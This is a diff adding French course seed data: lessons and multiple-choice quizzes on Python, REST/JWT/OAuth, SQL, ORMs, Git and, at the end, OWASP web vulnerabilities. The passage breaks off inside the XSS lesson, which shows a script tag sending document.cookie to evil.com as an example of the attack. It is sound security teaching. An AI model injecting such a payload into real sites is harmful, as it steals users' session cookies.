+              "C'est une convention purement esthétique sans effet réel",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Contrairement à `this` en JavaScript (implicite), Python exige que `self` soit explicitement le premier paramètre de toute méthode d'instance pour recevoir la référence à l'objet.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Organiser du code en modules",
+        content:
+          "Un **module** Python est simplement un fichier `.py` — ses fonctions/classes deviennent importables ailleurs avec `import`.\n\n" +
+          "```python\n# utils.py\ndef addition(a, b):\n    return a + b\n\n# main.py\nfrom utils import addition\nprint(addition(2, 3))  # 5\n```\n\n" +
+          "Un **package** est un dossier contenant plusieurs modules, avec un fichier `__init__.py` qui marque le dossier comme importable en tant qu'unité. Le bloc `if __name__ == \"__main__\":` permet à un fichier de se comporter différemment selon qu'il est exécuté directement (`python main.py`) ou importé comme module ailleurs — le code sous ce bloc ne s'exécute que dans le premier cas.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Qu'est-ce qui distingue un « module » d'un « package » en Python ?",
+            choices: [
+              "Aucune différence, ce sont des synonymes",
+              "Un module est un fichier `.py` unique, un package est un dossier contenant plusieurs modules",
+              "Un package ne peut contenir aucune fonction",
+              "Un module ne peut être utilisé qu'une seule fois",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Un module = un fichier `.py` importable. Un package = un dossier regroupant plusieurs modules, identifié comme tel via `__init__.py`.",
+          },
+          {
+            order: 2,
+            prompt: "À quoi sert `if __name__ == \"__main__\":` ?",
+            choices: [
+              "À déclarer la fonction principale obligatoire de tout script Python",
+              "À exécuter du code uniquement quand le fichier est lancé directement, pas quand il est importé ailleurs",
+              "À importer automatiquement tous les modules du projet",
+              "À définir le nom du fichier courant",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Ce bloc ne s'exécute que si le script est lancé directement (`python fichier.py`) — s'il est importé (`import fichier`) depuis un autre script, ce code est ignoré.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "Environnements virtuels : isoler ses dépendances",
+        content:
+          "Un **environnement virtuel** (venv) crée une installation Python isolée par projet, avec ses propres dépendances — sans ça, tous les projets partageraient les mêmes paquets installés globalement, avec des risques de conflits de versions entre projets.\n\n" +
+          "```bash\npython -m venv .venv        # crée l'environnement\nsource .venv/bin/activate   # l'active (Linux/macOS)\npip install requests        # installe DANS ce venv, pas globalement\npip freeze > requirements.txt  # fige les versions installées\n```\n\n" +
+          "`requirements.txt` liste les dépendances exactes du projet — un autre développeur (ou un serveur de déploiement) peut recréer le même environnement avec `pip install -r requirements.txt`, garantissant que tout le monde utilise les mêmes versions de paquets.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Pourquoi utiliser un environnement virtuel plutôt qu'installer les paquets globalement ?",
+            choices: [
+              "Ça rend Python plus rapide à l'exécution",
+              "Ça isole les dépendances par projet, évitant les conflits de versions entre projets différents",
+              "C'est obligatoire pour que `import` fonctionne",
+              "Ça remplace complètement le besoin de `pip`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Sans isolation, deux projets nécessitant des versions différentes d'une même bibliothèque entreraient en conflit sur une installation globale partagée — le venv évite ce problème.",
+          },
+          {
+            order: 2,
+            prompt: "À quoi sert le fichier `requirements.txt` ?",
+            choices: [
+              "À documenter les fonctionnalités du projet",
+              "À lister les dépendances et leurs versions exactes, pour recréer le même environnement ailleurs",
+              "À remplacer le code source du projet",
+              "C'est un fichier généré automatiquement sans utilité pratique",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`pip freeze > requirements.txt` fige les versions exactes installées — `pip install -r requirements.txt` permet ensuite à quiconque de recréer un environnement identique.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "python-async-testing",
+    title: "Python avancé : Async, Typing et Testing",
+    description: "Écrire du Python asynchrone, typé et testé — les pratiques qui distinguent un script jetable d'un vrai projet maintenable.",
+    category: "DEVELOPMENT",
+    skillKey: "python",
+    level: 3,
+    prerequisiteCourseKeys: ["python-oop-modules"],
+    lessons: [
+      {
+        order: 1,
+        title: "async/await en Python",
+        content:
+          "Python gère l'asynchrone avec `async`/`await`, via le module `asyncio` — le principe est similaire à JavaScript : une fonction `async def` retourne une **coroutine**, exécutée uniquement quand on l'`await` ou qu'on la lance dans une boucle d'événements.\n\n" +
+          "```python\nimport asyncio\n\nasync def recuperer_donnees():\n    await asyncio.sleep(1)  # simule un appel réseau\n    return \"données\"\n\nasync def main():\n    resultat = await recuperer_donnees()\n    print(resultat)\n\nasyncio.run(main())\n```\n\n" +
+          "Contrairement à JavaScript où l'asynchrone est natif au moteur, Python reste synchrone par défaut : mélanger du code bloquant (ex: `time.sleep()`) dans une fonction `async` bloque quand même toute la boucle d'événements — il faut utiliser les équivalents async (`asyncio.sleep()`) ou déléguer à un thread.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que retourne une fonction Python déclarée `async def` quand on l'appelle sans `await` ?",
+            choices: [
+              "Le résultat directement, comme une fonction normale",
+              "Une coroutine, qui ne s'exécute que si on l'`await` ou qu'on la lance dans une boucle d'événements",
+              "Toujours `None`",
+              "Une erreur de syntaxe",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Appeler une fonction `async def` crée un objet coroutine sans l'exécuter — il faut soit `await` cette coroutine, soit la passer à `asyncio.run()` pour réellement l'exécuter.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi utiliser `time.sleep()` (bloquant) dans une fonction `async` pose problème ?",
+            choices: [
+              "Ça n'a aucun effet négatif en Python",
+              "Ça bloque toute la boucle d'événements, empêchant les autres coroutines de s'exécuter pendant ce temps",
+              "Ça lève systématiquement une exception",
+              "Ça ralentit uniquement la fonction courante, pas les autres",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`time.sleep()` bloque le thread entier, y compris la boucle d'événements asyncio — il faut utiliser `asyncio.sleep()` (non-bloquant) pour ne pas geler les autres tâches asynchrones en cours.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Type hints : typer sans changer le runtime",
+        content:
+          "Depuis Python 3.5+, on peut annoter les types avec les **type hints** — purement indicatifs au runtime (Python reste dynamiquement typé), mais exploités par des outils comme `mypy` pour détecter des erreurs de type avant l'exécution.\n\n" +
+          "```python\ndef addition(a: int, b: int) -> int:\n    return a + b\n\nfrom typing import Optional, List\n\ndef trouver_user(id: int) -> Optional[dict]:\n    # peut retourner un dict ou None\n    ...\n\ndef lister_noms(users: List[dict]) -> List[str]:\n    return [u[\"nom\"] for u in users]\n```\n\n" +
+          "Les type hints ne sont **jamais vérifiés à l'exécution** par défaut : `addition(\"a\", \"b\")` s'exécute sans erreur immédiate malgré l'annotation `int` — c'est un outil séparé (`mypy`, `pyright`) qui analyse le code statiquement pour signaler ce genre d'incohérence, exactement comme le compilateur TypeScript le fait pour JS.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que se passe-t-il si on appelle `addition(\"a\", \"b\")` sur une fonction annotée `def addition(a: int, b: int) -> int`, sans utiliser `mypy` ?",
+            choices: [
+              "Python lève immédiatement une TypeError avant d'exécuter la fonction",
+              "La fonction s'exécute quand même, les type hints n'étant pas vérifiés au runtime par défaut",
+              "Le fichier ne compile pas",
+              "Python convertit automatiquement les strings en int",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Les type hints sont purement indicatifs pour Python au runtime — sans outil externe comme `mypy`, aucune vérification de type n'a lieu à l'exécution, même en cas d'incohérence flagrante.",
+          },
+          {
+            order: 2,
+            prompt: "Que signifie `Optional[dict]` comme type de retour ?",
+            choices: [
+              "La fonction retourne toujours un dict, jamais rien d'autre",
+              "La fonction peut retourner soit un dict, soit None",
+              "La fonction accepte un dict optionnel en paramètre",
+              "Le type dict est facultatif à typer",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`Optional[X]` est un raccourci pour `Union[X, None]` — ça signale explicitement que la fonction peut retourner `None`, un cas que l'appelant doit gérer.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "Tester son code avec pytest",
+        content:
+          "`pytest` est le framework de test le plus utilisé en Python — un test est simplement une fonction dont le nom commence par `test_`, qui utilise `assert` pour vérifier un résultat attendu.\n\n" +
+          "```python\n# calc.py\ndef addition(a, b):\n    return a + b\n\n# test_calc.py\nfrom calc import addition\n\ndef test_addition_positifs():\n    assert addition(2, 3) == 5\n\ndef test_addition_negatifs():\n    assert addition(-1, -1) == -2\n```\n\n" +
+          "`pytest` découvre automatiquement tous les fichiers `test_*.py` et exécute chaque fonction `test_*` — un `assert` qui échoue fait échouer le test correspondant, sans arrêter les autres. Les **fixtures** (`@pytest.fixture`) permettent de préparer un état commun réutilisable (ex: une connexion DB de test) entre plusieurs tests, sans dupliquer le code de setup.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Comment pytest identifie-t-il automatiquement quelles fonctions sont des tests ?",
+            choices: [
+              "Il faut les enregistrer manuellement dans un fichier de configuration",
+              "Toute fonction dont le nom commence par `test_` dans un fichier `test_*.py`",
+              "Toute fonction qui contient le mot `assert`",
+              "Uniquement les fonctions décorées avec `@test`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "pytest découvre automatiquement les fichiers `test_*.py` et y exécute chaque fonction dont le nom commence par `test_`, sans configuration manuelle nécessaire pour ce cas simple.",
+          },
+          {
+            order: 2,
+            prompt: "Quand un `assert` échoue dans un test pytest, que se passe-t-il pour les AUTRES tests du même fichier ?",
+            choices: [
+              "Tous les autres tests sont annulés automatiquement",
+              "Ils s'exécutent quand même normalement — seul le test contenant l'assertion échouée est marqué en échec",
+              "Le fichier entier refuse de s'exécuter",
+              "pytest corrige automatiquement l'erreur",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Chaque fonction `test_*` est indépendante — l'échec d'un `assert` dans l'une n'empêche pas les autres tests du même fichier (ou d'autres fichiers) de s'exécuter et d'être rapportés séparément.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "backend-rest-auth",
+    title: "Backend : API REST et Authentification",
+    description: "Concevoir une API REST propre et sécuriser l'accès avec JWT et OAuth — les bases indispensables de tout backend moderne.",
+    category: "DEVELOPMENT",
+    skillKey: "apis",
+    level: 3,
+    prerequisiteCourseKeys: ["js-intro"],
+    lessons: [
+      {
+        order: 1,
+        title: "Concevoir une API REST propre",
+        content:
+          "REST (**RE**presentational **S**tate **T**ransfer) est un style d'architecture, pas un protocole strict — quelques conventions en font une bonne API REST :\n\n" +
+          "- Les URLs représentent des **ressources** (noms, au pluriel) : `/users`, `/users/42`, pas des actions (`/getUser?id=42`).\n" +
+          "- Les méthodes HTTP portent l'action : `GET` (lire), `POST` (créer), `PUT`/`PATCH` (modifier), `DELETE` (supprimer) — pas besoin de le répéter dans l'URL.\n" +
+          "- Les codes de statut HTTP communiquent le résultat : `200` OK, `201` Créé, `400` requête invalide, `401` non authentifié, `403` non autorisé, `404` introuvable, `500` erreur serveur.\n" +
+          "- **Stateless** : chaque requête contient toute l'information nécessaire (ex: le token d'auth) — le serveur ne garde pas de session en mémoire entre les requêtes.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Dans une API REST bien conçue, comment doit-on représenter l'action de créer un utilisateur ?",
+            choices: [
+              "`GET /createUser`", "`POST /users`", "`GET /users/create`", "`DELETE /users/new`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "L'URL représente la ressource (`/users`), et la méthode HTTP `POST` porte l'action de création — pas besoin de verbe dans l'URL comme `/createUser`.",
+          },
+          {
+            order: 2,
+            prompt: "Que signifie « stateless » pour une API REST ?",
+            choices: [
+              "L'API ne peut jamais changer d'état",
+              "Chaque requête contient toute l'information nécessaire — le serveur ne garde pas de session en mémoire entre les requêtes",
+              "L'API n'a pas de base de données",
+              "L'API ne peut traiter qu'une requête à la fois",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le principe stateless signifie que le serveur ne dépend d'aucun état conservé entre deux requêtes — chaque requête doit s'authentifier et se contextualiser elle-même (ex: via un token).",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Authentification avec JWT",
+        content:
+          "Un **JWT** (JSON Web Token) est un token auto-porteur : il contient lui-même les informations d'identité (payload), signées cryptographiquement — le serveur peut vérifier son authenticité sans avoir besoin de stocker de session.\n\n" +
+          "Structure : `header.payload.signature` (3 parties encodées en Base64, séparées par des points). Le flux typique :\n\n" +
+          "1. L'utilisateur se connecte (login + mot de passe) → le serveur vérifie et génère un JWT signé.\n" +
+          "2. Le client stocke ce token et l'envoie dans l'en-tête `Authorization: Bearer <token>` de chaque requête suivante.\n" +
+          "3. Le serveur vérifie la signature du token (sans base de données !) pour confirmer qu'il n'a pas été modifié, et lit le payload pour identifier l'utilisateur.\n\n" +
+          "Un JWT a une **expiration** (`exp` dans le payload) — un token expiré doit être rejeté, forçant une reconnexion ou un rafraîchissement via un refresh token dédié.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Pourquoi un serveur n'a-t-il pas besoin de base de données pour vérifier un JWT ?",
+            choices: [
+              "Parce que les JWT ne peuvent jamais être falsifiés de toute façon",
+              "Parce que la signature cryptographique du token permet de vérifier son authenticité directement, sans consulter un stockage externe",
+              "Parce que les JWT n'expirent jamais",
+              "Ce n'est pas vrai, une base de données est toujours nécessaire",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le JWT est auto-porteur et signé : vérifier la signature (avec la clé secrète du serveur) suffit à confirmer que le contenu n'a pas été altéré, sans avoir besoin de retrouver une session stockée ailleurs.",
+          },
+          {
+            order: 2,
+            prompt: "Où le client doit-il envoyer le JWT pour s'authentifier sur les requêtes suivantes ?",
+            choices: [
+              "Dans le corps (body) de chaque requête GET",
+              "Dans l'en-tête `Authorization: Bearer <token>`",
+              "Dans l'URL en paramètre visible",
+              "Il n'a besoin de l'envoyer qu'une seule fois, jamais après",
+            ],
+            correctIndex: 1,
+            explanation:
+              "La convention standard est l'en-tête `Authorization: Bearer <token>` — le mettre dans l'URL l'exposerait dans les logs serveur et l'historique du navigateur, un risque de sécurité inutile.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "OAuth 2.0 : déléguer l'authentification",
+        content:
+          "**OAuth 2.0** résout un problème différent du login classique : permettre à une application (« client ») d'accéder à des ressources d'un utilisateur sur un service tiers (« Google », « GitHub »), **sans jamais voir son mot de passe**.\n\n" +
+          "Flux simplifié (Authorization Code) :\n\n" +
+          "1. L'utilisateur clique « Se connecter avec GitHub » sur l'app.\n" +
+          "2. Il est redirigé vers GitHub, où il autorise explicitement l'accès demandé (scopes).\n" +
+          "3. GitHub redirige vers l'app avec un **code d'autorisation** temporaire.\n" +
+          "4. L'app échange ce code contre un **access token** en coulisses (requête serveur-à-serveur, avec un secret client).\n" +
+          "5. L'app utilise cet access token pour appeler l'API GitHub au nom de l'utilisateur, dans la limite des scopes autorisés.\n\n" +
+          "OAuth gère l'**autorisation** (« qu'est-ce que l'app a le droit de faire »), pas directement l'**authentification** de l'utilisateur — OpenID Connect (OIDC) est une couche construite par-dessus OAuth spécifiquement pour ce second besoin.",
+        xpReward: 30,
+        questions: [
+          {
+            order: 1,
+            prompt: "Quel est l'avantage principal d'OAuth pour l'utilisateur qui se connecte via « Se connecter avec GitHub » ?",
+            choices: [
+              "L'application obtient directement son mot de passe GitHub pour plus de simplicité",
+              "L'application n'a jamais accès à son mot de passe — seulement à un access token limité aux scopes autorisés",
+              "OAuth ne présente aucun avantage réel",
+              "L'utilisateur doit créer un nouveau mot de passe spécifique à l'application",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le principe même d'OAuth est d'éviter que l'application tierce voie le mot de passe de l'utilisateur — elle reçoit un access token, révocable et limité aux permissions (scopes) accordées.",
+          },
+          {
+            order: 2,
+            prompt: "Que gère principalement OAuth 2.0, par opposition à OpenID Connect (OIDC) ?",
+            choices: [
+              "L'authentification de l'utilisateur (« qui est cette personne »)",
+              "L'autorisation (« qu'est-ce que l'application a le droit de faire au nom de l'utilisateur »)",
+              "Le chiffrement des mots de passe en base de données",
+              "La création automatique de comptes utilisateurs",
+            ],
+            correctIndex: 1,
+            explanation:
+              "OAuth 2.0 est né pour l'autorisation d'accès délégué — OpenID Connect (OIDC) ajoute une couche d'identité par-dessus spécifiquement pour répondre au besoin d'authentification.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "databases-sql-orm",
+    title: "Bases de données : SQL avancé et ORM",
+    description: "Aller plus loin que les requêtes SQL de base, comprendre les index et le rôle d'un ORM.",
+    category: "DEVELOPMENT",
+    skillKey: "sql",
+    level: 2,
+    prerequisiteCourseKeys: ["js-intro"],
+    lessons: [
+      {
+        order: 1,
+        title: "Jointures et agrégations",
+        content:
+          "Une **jointure** (`JOIN`) combine des lignes de plusieurs tables selon une condition commune, généralement une clé étrangère.\n\n" +
+          "```sql\nSELECT users.nom, orders.montant\nFROM users\nINNER JOIN orders ON orders.user_id = users.id;\n```\n\n" +
+          "`INNER JOIN` ne garde que les lignes qui matchent des deux côtés ; `LEFT JOIN` garde toutes les lignes de la table de gauche même sans correspondance à droite (valeurs `NULL` pour les colonnes manquantes). Les fonctions d'agrégation (`COUNT`, `SUM`, `AVG`, `MAX`, `MIN`) combinées à `GROUP BY` résument des groupes de lignes : `SELECT user_id, COUNT(*) FROM orders GROUP BY user_id;` compte les commandes par utilisateur. `HAVING` filtre après agrégation (contrairement à `WHERE`, qui filtre avant).",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Quelle est la différence entre `INNER JOIN` et `LEFT JOIN` ?",
+            choices: [
+              "Aucune différence, ce sont des synonymes",
+              "`INNER JOIN` ne garde que les lignes qui matchent des deux côtés ; `LEFT JOIN` garde aussi les lignes de gauche sans correspondance",
+              "`LEFT JOIN` ne fonctionne que sur des tables sans clé étrangère",
+              "`INNER JOIN` est toujours plus lent que `LEFT JOIN`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`INNER JOIN` exclut les lignes sans correspondance dans l'autre table ; `LEFT JOIN` conserve toutes les lignes de la table de gauche, avec `NULL` pour les colonnes de droite quand il n'y a pas de correspondance.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi utilise-t-on `HAVING` plutôt que `WHERE` pour filtrer sur le résultat de `COUNT(*)` ?",
+            choices: [
+              "`WHERE` et `HAVING` sont interchangeables dans tous les cas",
+              "`WHERE` filtre les lignes avant l'agrégation, `HAVING` filtre les groupes après agrégation — seul `HAVING` peut utiliser le résultat d'une fonction comme `COUNT(*)`",
+              "`HAVING` est plus rapide que `WHERE` dans tous les cas",
+              "`WHERE` ne fonctionne qu'avec `GROUP BY`",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`WHERE` s'applique avant que les lignes soient regroupées et agrégées — au moment où `WHERE` s'exécute, `COUNT(*)` n'existe pas encore. `HAVING` s'applique après, sur les groupes déjà formés.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Index : accélérer les requêtes",
+        content:
+          "Un **index** est une structure de données annexe (souvent un arbre B) qui permet à la base de données de retrouver des lignes sans parcourir toute la table (**full table scan**) — comme l'index d'un livre évite de tout lire pour trouver un mot.\n\n" +
+          "```sql\nCREATE INDEX idx_users_email ON users(email);\n```\n\n" +
+          "Un index accélère les `WHERE`/`JOIN`/`ORDER BY` sur la colonne indexée, mais a un coût : il ralentit légèrement les `INSERT`/`UPDATE`/`DELETE` (l'index doit être maintenu à jour), et occupe de l'espace disque supplémentaire. Les colonnes fréquemment filtrées ou jointes (clés étrangères, emails, slugs uniques) sont de bonnes candidates — indexer une colonne rarement filtrée, ou une table très petite, apporte peu de bénéfice pour un coût réel.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Quel est le principal bénéfice d'un index sur une colonne ?",
+            choices: [
+              "Il empêche toute donnée dupliquée dans la table",
+              "Il évite un parcours complet de la table (full table scan) pour les requêtes qui filtrent/joignent sur cette colonne",
+              "Il chiffre automatiquement les données de la colonne",
+              "Il réduit la taille de la base de données",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Un index permet à la base de retrouver directement les lignes concernées via une structure optimisée (arbre B typiquement), au lieu de parcourir chaque ligne de la table une par une.",
+          },
+          {
+            order: 2,
+            prompt: "Quel est le coût réel d'ajouter un index sur une colonne ?",
+            choices: [
+              "Aucun coût, un index n'a que des avantages",
+              "Il ralentit légèrement les écritures (INSERT/UPDATE/DELETE) et consomme de l'espace disque supplémentaire",
+              "Il rend les lectures plus lentes",
+              "Il empêche d'utiliser `JOIN` sur cette table",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Chaque écriture doit aussi mettre à jour la structure de l'index en plus de la table elle-même — indexer sans discernement toutes les colonnes peut donc ralentir les écritures inutilement.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "Le rôle d'un ORM",
+        content:
+          "Un **ORM** (Object-Relational Mapper, ex: Prisma, Sequelize, SQLAlchemy) fait le pont entre des objets/classes du langage applicatif et des lignes de tables SQL — on manipule des objets, l'ORM génère le SQL correspondant.\n\n" +
+          "```ts\n// Avec un ORM (Prisma)\nconst user = await prisma.user.findUnique({ where: { id: 1 } });\n\n// SQL équivalent généré\n// SELECT * FROM users WHERE id = 1 LIMIT 1;\n```\n\n" +
+          "Avantages : moins de SQL à écrire à la main, protection native contre l'injection SQL (requêtes paramétrées automatiquement), migrations de schéma versionnées, autocomplétion typée. Limite à connaître : un ORM peut générer du SQL sous-optimal pour des requêtes complexes (agrégations lourdes, jointures multiples) — savoir lire le SQL généré (ou écrire une requête brute pour ces cas précis) reste une compétence utile, pas remplaçable entièrement par l'ORM.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Quel est le rôle principal d'un ORM ?",
+            choices: [
+              "Remplacer complètement le besoin d'une base de données",
+              "Faire le pont entre des objets du code applicatif et des lignes de tables SQL, en générant le SQL correspondant",
+              "Accélérer physiquement le disque dur",
+              "Chiffrer automatiquement toute la base de données",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Un ORM traduit des opérations sur des objets/classes du langage applicatif en requêtes SQL équivalentes, évitant d'écrire le SQL à la main pour les cas courants.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi ne peut-on pas toujours se reposer aveuglément sur l'ORM pour toutes les requêtes ?",
+            choices: [
+              "Les ORM ne fonctionnent jamais correctement",
+              "Sur des requêtes complexes (agrégations lourdes, jointures multiples), l'ORM peut générer du SQL sous-optimal — savoir lire/écrire du SQL reste utile",
+              "Les ORM ne permettent jamais d'écrire de requête brute",
+              "Utiliser un ORM est toujours plus lent que le SQL brut, sans exception",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Un ORM optimise pour le cas général, pas pour chaque requête spécifique — comprendre le SQL généré (et pouvoir écrire une requête brute quand nécessaire) reste une compétence complémentaire utile.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "git-advanced-workflow",
+    title: "Git avancé : branches, rebase et workflows",
+    description: "Aller au-delà de `git add/commit/push` : gérer des branches proprement, comprendre rebase vs merge, résoudre des conflits.",
+    category: "DEVELOPMENT",
+    skillKey: "git",
+    level: 2,
+    lessons: [
+      {
+        order: 1,
+        title: "Branches : isoler le travail en cours",
+        content:
+          "Une **branche** Git est un pointeur mobile vers un commit — créer une branche est quasi instantané et ne duplique pas les fichiers, contrairement à ce qu'on pourrait imaginer.\n\n" +
+          "```bash\ngit checkout -b feature/login   # crée et bascule sur une nouvelle branche\ngit add .\ngit commit -m \"add login form\"\ngit push -u origin feature/login\n```\n\n" +
+          "Le workflow classique : chaque fonctionnalité/correctif se développe sur sa propre branche, isolée de `main` (qui reste toujours stable/déployable), puis est fusionnée via une **Pull Request** après revue de code — jamais de commit direct sur `main` en équipe.",
+        xpReward: 20,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que représente techniquement une branche Git ?",
+            choices: [
+              "Une copie complète et indépendante de tous les fichiers du projet",
+              "Un pointeur mobile vers un commit — sa création est quasi instantanée",
+              "Un dossier séparé sur le disque dur",
+              "Un fichier de configuration Git spécial",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Une branche n'est qu'une référence légère vers un commit — Git ne duplique aucun fichier à sa création, ce qui la rend quasi instantanée même sur un très gros dépôt.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi éviter les commits directs sur `main` en travail d'équipe ?",
+            choices: [
+              "Git l'interdit techniquement",
+              "Ça empêche la revue de code (Pull Request) et risque de casser une branche censée rester stable/déployable",
+              "`main` ne peut contenir aucun commit",
+              "C'est plus lent que de committer sur une autre branche",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Passer par une Pull Request permet une revue avant fusion et garde `main` toujours dans un état stable — un commit direct contourne ce filet de sécurité collectif.",
+          },
+        ],
+      },
+      {
+        order: 2,
+        title: "Rebase vs Merge",
+        content:
+          "`git merge` et `git rebase` intègrent tous deux les changements d'une branche dans une autre, mais différemment :\n\n" +
+          "- `git merge feature` : crée un **commit de fusion** qui relie les deux historiques — préserve l'historique exact tel qu'il s'est déroulé, mais peut rendre le log plus difficile à lire (branches entrelacées).\n" +
+          "- `git rebase main` (depuis `feature`) : **rejoue** les commits de `feature` par-dessus la dernière version de `main`, un par un — produit un historique linéaire, plus lisible, mais réécrit les hash de commits.\n\n" +
+          "Règle d'or : ne jamais `rebase` une branche déjà partagée/poussée sur laquelle d'autres personnes travaillent — réécrire l'historique casse la synchronisation de leurs copies locales. Rebase est sûr sur une branche locale/personnelle pas encore partagée.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Quelle est la différence principale entre `git merge` et `git rebase` ?",
+            choices: [
+              "`merge` ne fonctionne que sur GitHub, `rebase` en local uniquement",
+              "`merge` crée un commit de fusion préservant l'historique tel quel ; `rebase` rejoue les commits par-dessus l'autre branche, produisant un historique linéaire",
+              "Ce sont des synonymes exacts",
+              "`rebase` supprime définitivement les commits de la branche",
+            ],
+            correctIndex: 1,
+            explanation:
+              "`merge` garde une trace exacte de la façon dont les branches ont divergé et se sont recombinées (commit de fusion) ; `rebase` réécrit l'historique pour donner l'impression que le travail s'est fait de façon linéaire.",
+          },
+          {
+            order: 2,
+            prompt: "Pourquoi ne faut-il jamais rebaser une branche déjà partagée avec d'autres développeurs ?",
+            choices: [
+              "Git l'interdit techniquement et refuse la commande",
+              "Le rebase réécrit les hash des commits, désynchronisant les copies locales des autres personnes qui travaillent sur la même branche",
+              "Ça n'a aucune conséquence, c'est juste une convention arbitraire",
+              "Ça supprime tous les fichiers du dépôt distant",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Le rebase crée de nouveaux commits avec de nouveaux hash pour remplacer les anciens — quiconque a déjà les anciens commits en local se retrouve avec un historique divergent et incompatible.",
+          },
+        ],
+      },
+      {
+        order: 3,
+        title: "Résoudre un conflit de fusion",
+        content:
+          "Un **conflit** survient quand Git ne peut pas fusionner automatiquement deux changements sur les mêmes lignes d'un fichier. Git marque la zone en conflit directement dans le fichier :\n\n" +
+          "```\n<<<<<<< HEAD\nconst greeting = \"Bonjour\";\n=======\nconst greeting = \"Salut\";\n>>>>>>> feature/greeting\n```\n\n" +
+          "Résolution : éditer le fichier pour garder la version voulue (ou combiner les deux), supprimer les marqueurs `<<<<<<<`/`=======`/`>>>>>>>`, puis `git add <fichier>` et `git commit` (pour un merge) ou `git rebase --continue` (pour un rebase) pour valider la résolution. `git status` liste toujours les fichiers encore en conflit — ne jamais committer en laissant des marqueurs de conflit oubliés dans le code.",
+        xpReward: 25,
+        questions: [
+          {
+            order: 1,
+            prompt: "Que représentent les marqueurs `<<<<<<<`, `=======` et `>>>>>>>` dans un fichier ?",
+            choices: [
+              "Une erreur de syntaxe à corriger dans le code lui-même",
+              "Les deux versions en conflit d'une même zone du fichier, insérées par Git pour que le développeur choisisse laquelle garder",
+              "Un commentaire spécial généré automatiquement à ignorer",
+              "Une commande Git à exécuter",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Git ne peut pas décider seul laquelle des deux versions garder sur les lignes en conflit — il insère les deux, séparées par ces marqueurs, pour que le développeur tranche manuellement.",
+          },
+          {
+            order: 2,
+            prompt: "Après avoir résolu un conflit dans un fichier, quelle est la prochaine étape avant de finaliser un merge ?",
+            choices: [
+              "Rien, Git détecte automatiquement la résolution",
+              "`git add <fichier>` puis `git commit` pour valider la résolution",
+              "Supprimer complètement le fichier",
+              "Relancer `git clone` du dépôt entier",
+            ],
+            correctIndex: 1,
+            explanation:
+              "Après avoir édité le fichier pour retirer les marqueurs et garder la version voulue, il faut `git add` le fichier résolu puis `git commit` pour indiquer à Git que le conflit est réglé.",
+          },
+        ],
+      },
+    ],
+  },
+  {
+    key: "web-vulnerabilities-owasp",
+    title: "Vulnérabilités Web (OWASP)",
+    description: "Comprendre les failles web les plus courantes — XSS, injection SQL, CSRF, SSRF — pour savoir les reconnaître et s'en protéger.",
+    category: "CYBERSECURITY",
+    skillKey: "web-security",
+    level: 3,
+    prerequisiteCourseKeys: ["cyber-fundamentals"],
+    lessons: [
+      {
+        order: 1,
+        title: "XSS : injection de script côté client",
+        content:
+          "Le **Cross-Site Scripting (XSS)** survient quand une application affiche du contenu fourni par un utilisateur sans le neutraliser (échapper), permettant l'exécution de JavaScript arbitraire dans le navigateur d'une victime.\n\n" +
+          "```html\n<!-- Un commentaire utilisateur affiché sans échappement -->\n<div>Commentaire : <script>fetch('https://evil.com?cookie='+document.cookie)</script></div>\n```\n\n" +
